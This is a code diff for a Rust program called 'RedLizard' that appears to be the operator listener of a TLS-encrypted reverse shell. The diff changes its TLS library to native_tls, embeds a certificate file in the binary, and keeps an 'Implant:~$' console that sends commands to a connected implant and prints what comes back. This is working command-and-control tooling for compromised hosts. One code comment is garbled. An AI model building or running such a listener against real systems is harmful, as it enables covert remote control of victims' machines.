@@ -4,38 +4,53 @@ use std::io;
 use std::env;
 use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
+use std::process::exit;
 use std::thread;
-use openssl::ssl::{SslMethod, SslAcceptor, SslStream, SslFiletype};
+use native_tls::{Identity, TlsAcceptor, TlsStream};
 use std::sync::Arc;
 
-fn handle_client(mut stream: SslStream<TcpStream>) {
-    println!("[+] Implant Armed.");
+fn handle_client(mut stream: TlsStream<TcpStream>) {
+    println!("[+] Implant Armed."); 
     loop {
         print!("Implant:~$ ");
         io::stdout().flush().expect("failed to get it");
         let mut input = String::new();
-        io::stdin().read_line(&mut input);
-        let buf = input.split_whitespace().collect::<Vec<_>>();
+        let _ = io::stdin().read_line(&mut input);
+        
         stream.write(&mut input.as_bytes()).unwrap();
         let mut data = [0 as u8; 10024];
-        stream.read(&mut data);
+        let _ = stream.read(&mut data);
         let string = String::from_utf8_lossy(&data);
-        println!("{}", string);
+        println!("{}", string); 
     }
 }
 
 
 fn main() {
+
     let args: Vec<String> = env::args().collect();
-    let port = &args[1];
+
+    if args.len()<3{
+        println!("Pass the certificate password and the port as arguments");
+        exit(1);
+    }
+
+    // read the password as first passed arg
+    let passwd = &args[1];
+    //*Certificate confilet key = "zinz.key";guration_________________________
+    let cert_b = include_bytes!("zinz.pfx");
+    //parse the certificate as byte array
+    let identity = Identity::from_pkcs12(cert_b, passwd).unwrap();
+    // read the port as second passed arg   
+    let port = &args[2];
     let mut complete = "0.0.0.0:".to_string();
+
     complete.push_str(&port);
-    let mut acceptor = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
-    acceptor.set_private_key_file("server.key", SslFiletype::PEM).unwrap();
-    acceptor.set_certificate_chain_file("server.crt").unwrap(); 
-    acceptor.check_private_key().unwrap();
-    let acceptor = Arc::new(acceptor.build());
-    let listener2 = TcpListener::bind(&complete).unwrap();
+    let listener = TcpListener::bind(complete).expect("Cannot initiate the local TCP connection");
+    let acceptor = TlsAcceptor::new(identity).unwrap();
+    let acceptor = Arc::new(acceptor);
+
+
     println!("{}", r" \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
 / / / / / / / / / | | / / / / / / __  / / / / / / / / | | / / / / / / / / /
  \ \ \ \ \ \ \ \ \| |\ \ \ \ \   /..\  ` ` \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
@@ -58,7 +73,7 @@ fn main() {
     println!("\n[+] Welcome to RedLizard - trickster0 \n");
     // accept connections and process them, spawning a new thread for each one
     println!("[+] Server listening on port {}",&port);
-    for stream2 in listener2.incoming() {
+    for stream2 in listener.incoming() {
         match stream2 {
             Ok(stream2) => {
                 println!("New connection: {}", stream2.peer_addr().unwrap());
